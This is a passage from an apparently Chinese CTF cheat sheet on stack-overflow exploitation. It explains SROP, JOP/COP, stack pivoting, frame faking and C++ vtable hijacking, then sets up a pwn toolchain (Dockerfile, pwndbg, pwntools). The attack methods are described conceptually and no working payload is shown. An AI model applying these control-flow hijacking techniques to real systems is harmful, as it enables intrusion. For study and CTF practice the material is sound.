fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于整个Signal Frame都被保存在栈中，因此通过栈溢出我们可以读写对应的Signal Frame，这时内核态执行完毕以后调用sigreturn恢复进程寄存器的时候，我们就可以控制rip/eip的值，劫持控制流，我们也可以手动调用sigreturn系统调用，然后在栈上伪造一个Signal Frame，这样就可以控制所有寄存器的值。我们甚至可以伪造多个不同的Signal Frame执行不同的系统调用或函数，例如这个Frame可以调用read，另一个调用write等等。</p><p>实际上pwntools中已经集成了针对SROP的利用<code>SigreturnFrame()</code>，直接实例化一个这个类就可以很容易修改Signal Frame中寄存器的值，修改完成后将其转为str就得到了对应的payload，直接send即可，非常方便。</p><h2 id="0x8A-JOP"><a href="#0x8A-JOP" class="headerlink" title="0x8A JOP"></a>0x8A JOP</h2><p>JOP即Jump-Oriented Programming（面向跳转编程），说白了就是只用jmp寄存器完成getshell，例如<code>pop rax; jmp rax</code>，大致原理与ROP相同。</p><h2 id="0x8B-COP"><a href="#0x8B-COP" class="headerlink" title="0x8B COP"></a>0x8B COP</h2><p>COP即Call-Oriented Programming（面向调用编程），说白了就是只用call寄存器完成getshell，例如<code>pop rax; call rax</code>，大致原理与ROP相同。</p><h2 id="0x8C-Stack-Pivoting"><a href="#0x8C-Stack-Pivoting" class="headerlink" title="0x8C Stack Pivoting"></a>0x8C Stack Pivoting</h2><p>也称作栈迁移，如果可以控制栈顶指针sp，就可以将栈迁移到其他可读写的地址，通常情况下我们虽然可以很容易控制sp，但是其他方法就可以getshell，所以一般用不到栈迁移，但是在某些极端情况下栈迁移也是非常有用的：</p><ol><li>可以溢出的长度很少，无法构造较长的rop链</li><li>开启了PIE，我们不知道栈地址，可以控制sp的话就可以将栈迁移到已知地址</li><li>甚至可以将栈迁移到堆空间结合堆溢出控制栈上的内容</li></ol><p>攻击前提：</p><ol><li>可以劫持控制流</li><li>可以控制栈顶指针sp，例如<code>pop rsp; ret</code>这类的gadgets。其实万金油csu中就有现成的可以控制sp的gadget，位置在偏移+3处。</li></ol><h2 id="0x8D-Frame-Faking"><a href="#0x8D-Frame-Faking" class="headerlink" title="0x8D Frame Faking"></a>0x8D Frame Faking</h2><p>顾名思义，伪造一个函数栈劫持控制流，其实和栈迁移一样，只不过是将栈底迁移到已知的可控地址处，利用<code>leave; ret</code>gadgets来劫持控制流，即如果栈底可控，那么通过leave指令，栈顶也就可控，ret也可控。</p><p>leave指令相当于<code>move esp,ebp; pop ebp</code>，也就是<code>esp=ebp &amp;&amp; ebp=old_ebp</code>，如果我们可以通过栈溢出修改<code>old_ebp</code>为我们可控的地址<code>evil_ebp</code>，那么在执行leave的时候首先修改esp为ebp，之后修改ebp为我们的<code>evil_ebp</code>，现在栈底我们可控，之后执行ret指令，也就是<code>leave; ret</code>gadget，这时又会执行一次leave，esp就变成了我们的<code>evil_ebp</code>，那么这时候整个栈顶和栈底都到了我们可控的地址处，这时又修改ebp到其他地方（可以是我们控制的地方，不过已经无所谓了），然后执行gadget中的ret指令 ，但是这时整个栈都到了我们可控的地址处，也就是说我们可以任意控制栈上的内容，可以很容易构造其他rop链了。</p><p>其实说白了，栈伪造就是栈迁移的升级版，其利用范围和栈迁移一样，但是攻击前提就需要寻找到一条<code>levae; ret</code>这样的gadget，其实这种gadget很好找。栈伪造的原理如下所示，假设0x0开始是程序原本的栈，但是通过栈溢出我们只能修改ebp和ret，这时无法构造长的rop链，但是我们修改ebp为0x800010，也就是我们伪造的栈地址，修改ret为0x400070，也就是<code>leave; ret</code>gadget，执行完以后<code>leave; ret</code>gadget以后栈就会被迁移到0x800010处，这时我们就可以完全控制栈的内容了，可以构造任意长度的rop链。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x0 AAAA</span><br><span class="line">0x4 AAAA</span><br><span class="line">0x8 old_ebp (&#x3D;0x80001a)</span><br><span class="line">0xc ret (&#x3D;0x40075)</span><br><span class="line">...</span><br><span class="line">0x400070 leave; ret</span><br><span class="line">...</span><br><span class="line">0x800010 AAAA</span><br><span class="line">0x800014 gadgets_addr</span><br><span class="line">0x800018 gadgets_addr</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="0x8E-Other-Tricks"><a href="#0x8E-Other-Tricks" class="headerlink" title="0x8E Other Tricks"></a>0x8E Other Tricks</h2><ol><li><p>控制rax/eax</p><p> 有时候系统调用需要我们控制al寄存器，但是类似<code>pop rax/eax; ret</code>这种gadgets很难找，这时若可以调用alarm函数，那么可以通过依次调用alarm(x)，alarm(0)即可将rax设置为x，而很多题目都会设置一个alarm定时终止程序防止过多的socket连接占用资源。其实不止alarm，其他函数在调用完成后也可能会修改部分寄存器的值。</p></li><li><p>栈重叠</p><p> 对于两个连续调用的函数，第一个函数执行完成后其栈桢被回收（即esp=ebp），但是被回收的栈上保存的内容并不会被清空，这时开始执行第二个函数，开辟新的栈桢，第二个函数开辟的栈桢中某些未初始化的局部变量的默认值可能会受到第一个函数中未被清空的局部变量的影响</p></li></ol><h1 id="0x9-C"><a href="#0x9-C" class="headerlink" title="0x9 C++"></a>0x9 C++</h1><p>对于C++的pwn大都针对于虚函数。C++支持多态与虚函数，基类的虚函数仅负责给出函数的定义，而该函数的具体实现由子类决定。由于在编译期间无法确定具体对象所调用的虚函数，因此C++主要通过动态绑定的方法实现了虚函数，即在程序运行过程中根据对象的实际类型决定调用哪个虚函数。简而言之，虚函数的目的就是为了通过一个基类指针可以调用子类的同名函数，而这一功能在编译期间无法实现，主要通过虚表进行延迟绑定实现。</p><p>每个包含虚函数的类都会有一个虚表（vtable），该类的所有对象共用一个虚表，虚表其实是一个指针数组，数组中每个元素都是一个指向一个虚函数的指针。虚表一般位于.rodata段中，位于类的定义数据的起始位置，只读不可写。在程序编译的时候虚表内容就已经确定。若一个子类继承了包含虚函数的类，该子类也有一个虚表，虚表中的指针会指向其继承树中最近的一个类的虚函数。类的每一个对象都保存一个指向该对象所属类的虚表的指针__vptr，当调用一个对象的虚函数的时候，通过该对象的虚表指针找到该类的虚表，之后在虚表中找到对应的函数地址并且调用。</p><p>假设有如下继承关系。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A::vfunc1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A::vfunc2()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A::func1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A::func2()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_data1, m_data2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;B::vfunc1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;B::func1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_data3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span> <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;C::vfunc2()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;C::func2()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_data1, m_data4;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    B b;</span><br><span class="line">    C c;</span><br><span class="line">    A *p;</span><br><span class="line">    </span><br><span class="line">    p = &amp;b;</span><br><span class="line">    p-&gt;func1();  <span class="comment">// A::func1()</span></span><br><span class="line">    p-&gt;func2();  <span class="comment">// A::func2()</span></span><br><span class="line">    p-&gt;vfunc1();  <span class="comment">// B::vfunc1()</span></span><br><span class="line">    p-&gt;vfunc2();  <span class="comment">// A::vfunc2()</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    </span><br><span class="line">    p = &amp;c;</span><br><span class="line">    p-&gt;func1();  <span class="comment">// A::func1()</span></span><br><span class="line">    p-&gt;func2();  <span class="comment">// A::func2()</span></span><br><span class="line">    p-&gt;vfunc1();  <span class="comment">// B::vfun1()</span></span><br><span class="line">    p-&gt;vfunc2();  <span class="comment">// C::vfun2()</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>p是一个A类的指针，p首先指向B的对象b，此时<code>b-&gt;__vptr</code>指向B的虚表，在虚表中查询对应函数地址即可找到真正调用的函数。内存中A，B，C三个类的虚表如下所示。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/10.png"></p><p>针对C++的pwn基本都是劫持虚表，但是虚表本身不可写，所以可以劫持一个对象指向虚表的虚表指针。目前有两种主要的攻击手法：伪造虚表，让类的虚表指针指向伪造的一个虚表，或者修改虚表指针指向其他类的虚表。</p><h1 id="0xA-Tools"><a href="#0xA-Tools" class="headerlink" title="0xA Tools"></a>0xA Tools</h1><h2 id="0xA0-Docker"><a href="#0xA0-Docker" class="headerlink" title="0xA0 Docker"></a>0xA0 Docker</h2><p>建议使用Docker搭建本地环境，方便调试程序，本人使用的docker环境的dockerfile如下(Ubuntu 18.04)，其中包含了后文中的大部分离线工具 </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y ca-certificates</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> sources.list /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> pip.conf /root/.pip/pip.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> dpkg --add-architecture i386 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get -y update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt install -y \</span></span><br><span class="line"><span class="bash">    zsh \</span></span><br><span class="line"><span class="bash">    seccomp \</span></span><br><span class="line"><span class="bash">    libseccomp-dev \</span></span><br><span class="line"><span class="bash">    libc6:i386 \</span></span><br><span class="line"><span class="bash">    libc6-dbg:i386 \</span></span><br><span class="line"><span class="bash">    libc6-dbg \</span></span><br><span class="line"><span class="bash">    lib32stdc++6 \</span></span><br><span class="line"><span class="bash">    g++-multilib \</span></span><br><span class="line"><span class="bash">    cmake \</span></span><br><span class="line"><span class="bash">    ipython3 \</span></span><br><span class="line"><span class="bash">    upx-ucl \</span></span><br><span class="line"><span class="bash">    vim \</span></span><br><span class="line"><span class="bash">    net-tools \</span></span><br><span class="line"><span class="bash">    iputils-ping \</span></span><br><span class="line"><span class="bash">    libffi-dev \</span></span><br><span class="line"><span class="bash">    libssl-dev \</span></span><br><span class="line"><span class="bash">    python3-dev \</span></span><br><span class="line"><span class="bash">    python3-pip \</span></span><br><span class="line"><span class="bash">    python-pip \</span></span><br><span class="line"><span class="bash">    build-essential \</span></span><br><span class="line"><span class="bash">    ruby \</span></span><br><span class="line"><span class="bash">    ruby-dev \</span></span><br><span class="line"><span class="bash">    tmux \</span></span><br><span class="line"><span class="bash">    strace \</span></span><br><span class="line"><span class="bash">    ltrace \</span></span><br><span class="line"><span class="bash">    nasm \</span></span><br><span class="line"><span class="bash">    wget \</span></span><br><span class="line"><span class="bash">    radare2 \</span></span><br><span class="line"><span class="bash">    gdb \</span></span><br><span class="line"><span class="bash">    gdb-multiarch \</span></span><br><span class="line"><span class="bash">    netcat \</span></span><br><span class="line"><span class="bash">    socat \</span></span><br><span class="line"><span class="bash">    git \</span></span><br><span class="line"><span class="bash">    patchelf \</span></span><br><span class="line"><span class="bash">    gawk \</span></span><br><span class="line"><span class="bash">    file \</span></span><br><span class="line"><span class="bash">    tree \</span></span><br><span class="line"><span class="bash">    python3-distutils \</span></span><br><span class="line"><span class="bash">    bison --fix-missing &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apt/list/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip3 install --no-cache-dir --default-timeout=100 \</span></span><br><span class="line"><span class="bash">    ropgadget \</span></span><br><span class="line"><span class="bash">    pwntools \</span></span><br><span class="line"><span class="bash">    z3-solver \</span></span><br><span class="line"><span class="bash">    smmap2 \</span></span><br><span class="line"><span class="bash">    apscheduler \</span></span><br><span class="line"><span class="bash">    ropper \</span></span><br><span class="line"><span class="bash">    unicorn \</span></span><br><span class="line"><span class="bash">    keystone-engine \</span></span><br><span class="line"><span class="bash">    capstone \</span></span><br><span class="line"><span class="bash">    angr \</span></span><br><span class="line"><span class="bash">    pebble</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    gem install one_gadget seccomp-tools &amp;&amp; rm -rf /var/lib/gems/2.*/cache/* </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/pwndbg/pwndbg &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> pwndbg &amp;&amp; chmod +x setup.sh &amp;&amp; ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/scwuaptx/Pwngdb.git /root/Pwngdb &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> /root/Pwngdb &amp;&amp; cat /root/Pwngdb/.gdbinit  &gt;&gt; /root/.gdbinit &amp;&amp; \</span></span><br><span class="line"><span class="bash">    sed -i <span class="string">&quot;s?source ~/peda/peda.py?# source ~/peda/peda.py?g&quot;</span> /root/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/niklasb/libc-database.git libc-database &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;/libc-database/&quot;</span> &gt; ~/.libcdb_path</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/matrix1001/glibc-all-in-one glibc-all-in-one </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chsh -s $(<span class="built_in">which</span> zsh) &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh &amp;&amp; \</span></span><br><span class="line"><span class="bash">    cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install pwntools --no-cache-dir &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y locales &amp;&amp; \</span></span><br><span class="line"><span class="bash">    locale-gen en_US &amp;&amp; locale-gen en_US.UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG en_US.UTF-<span class="number">8</span>  </span><br><span class="line"><span class="keyword">ENV</span> LANGUAGE en_US:en  </span><br><span class="line"><span class="keyword">ENV</span> LC_ALL en_US.UTF-<span class="number">8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0xA1-IDA"><a href="#0xA1-IDA" class="headerlink" title="0xA1 IDA"></a>0xA1 IDA</h2><p>最常用的逆向工具，可以很方便的将汇编代码反编译为便于人类可读的伪代码。</p><h2 id="0xA2-GDB-amp-pwndbg"><a href="#0xA2-GDB-amp-pwndbg" class="headerlink" title="0xA2 GDB&amp;pwndbg"></a>0xA2 GDB&amp;pwndbg</h2><p>gdb为linux自带的程序调试工具，但是原生的gdb非常难用，因此可以安装pwndbg插件增强gdb的功能，安装方法如下所示，在前文的dockerfile中集成了pwndbg。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>pwndbd文档为<a href="https://browserpwndbg.readthedocs.io/en/docs/">https://browserpwndbg.readthedocs.io/en/docs/</a>。常用的pwndbg命令如下。</p><table><thead><tr><th align="center">命令</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">set args xxxx xxxx</td><td align="center">设置程序的args为xxxx和xxxx</td></tr><tr><td align="center">vmmap</td><td align="center">查看程序的所有地址</td></tr><tr><td align="center">run</td><td align="center">直接执行程序</td></tr><tr><td align="center">start</td><td align="center">从头开始执行程序，相当于在第一行代码处下断点并且开始执行，通常这不会从main函数开始执行，而是libc中的start</td></tr><tr><td align="center">b *0xxxxxxxx</td><td align="center">在地址0xxxxxxxx处下断点</td></tr><tr><td align="center">b main</td><td align="center">在main函数的开始处下断点</td></tr><tr><td align="center">b func+10</td><td align="center">在func+10处下断点</td></tr><tr><td align="center">b func+10 if i == 1</td><td align="center">条件断点，gdb必须可以找到变量i</td></tr><tr><td align="center">d breakpoints</td><td align="center">删除所有断点</td></tr><tr><td align="center">d breakpoints 1</td><td align="center">删除编号为1的断点</td></tr><tr><td align="center">i breakpoints</td><td align="center">查看所有断点</td></tr><tr><td align="center">i functions</td><td align="center">查看程序目前所有的函数名称与地址</td></tr><tr><td align="center">attach 123</td><td align="center">挂载到进程号123的程序，通常和pwntools配合使用</td></tr><tr><td align="center">stack</td><td align="center">查看栈上的东西</td></tr><tr><td align="center">regs</td><td align="center">查看目前所有寄存器的值</td></tr><tr><td align="center">got</td><td align="center">查看got表的信息</td></tr><tr><td align="center">plt</td><td align="center">查看plt表的信息</td></tr><tr><td align="center">heap</td><td align="center">查看堆上的chunk</td></tr><tr><td align="center">heap_info</td><td align="center">查看heap_info的信息</td></tr><tr><td align="center">arena</td><td align="center">查看所有arena的信息</td></tr><tr><td align="center">bins</td><td align="center">查看所有bin的信息</td></tr><tr><td align="center">tcache</td><td align="center">查看tcache的信息</td></tr><tr><td align="center">fastbins</td><td align="center">查看fastbins所有的chunk</td></tr><tr><td align="center">smallbins</td><td align="center">查看smallbins所有的chunk</td></tr><tr><td align="center">largebins</td><td align="center">查看largebins所有的chunk</td></tr><tr><td align="center">unsortedbin</td><td align="center">查看unsortedbin的所有chunk</td></tr><tr><td align="center">top_chunk</td><td align="center">查看top chunk的信息</td></tr><tr><td align="center">x/20xw 0xxxxx</td><td align="center">以十六进制，4字节为单位打印20个该地址保存的值，32位程序常用</td></tr><tr><td align="center">x/20xh 0xxxxx</td><td align="center">以十六进制，2字节为单位打印20个该地址保存的值</td></tr><tr><td align="center">x/20xg 0xxxxx</td><td align="center">以十六进制，8字节为单位打印20个该地址保存的值，64位程序常用</td></tr><tr><td align="center">x/20i 0xxxxx</td><td align="center">将该地址保存的值解析为指令打印20条</td></tr><tr><td align="center">x/20s 0xxxxx</td><td align="center">将改地址保存的值解析为字符串打印20个</td></tr><tr><td align="center">rop</td><td align="center">等同用使用ropgadget</td></tr><tr><td align="center">ropper</td><td align="center">等同于使用ropper</td></tr><tr><td align="center">checksec</td><td align="center">等同于使用checksec，该命令来自pwntools</td></tr><tr><td align="center">canary</td><td align="center">打印当前栈上的canary</td></tr><tr><td align="center">retaddr</td><td align="center">打印当前站上的ret地址</td></tr><tr><td align="center">distance 0xxxxx 0xxxxx</td><td align="center">计算两个地址之间的距离</td></tr><tr><td align="center">cyclic 10</td><td align="center">生成10个字节junk data，生成的junk data是有规律的，例如aaabaaacaaad等等，该命令来自pwntools</td></tr></tbody></table><h2 id="0xA3-pwntools"><a href="#0xA3-pwntools" class="headerlink" title="0xA3 pwntools"></a>0xA3 pwntools</h2><p>是一个专门为pwn而生的python库，其中集成了很多非常友好的pwn相关的API以及利用方法，很多手工利用很复杂的方法在pwntools中只需要一个函数就可以。</p><p>安装pwntools。在前文的dockerfile中集成了python2和python3的pwntools。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python2 -m pip install --upgrade pip==20.3.4</span><br><span class="line">python2 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>下面是一个比较常用的pwntools脚本框架。若该脚本接收了参数，则会启动远程连接，否则仅为本地测试。可以根据<code>context.clear(arch=&#39;amd64&#39;)</code>来指定程序是否为64位，根据<code>context.update(log_level=&#39;debug&#39;)</code>来指定是否开启debug模式，根据<code>libc = ELF(&#39;./libc6_2.27-3ubuntu1.2_amd64.so&#39;)</code>来指定需要使用的libc文件，此外，pg是一个payload生成器，也就是cyclic，例如<code>pg.get(8)</code>会得到字符串<code>aaaaaaab</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span 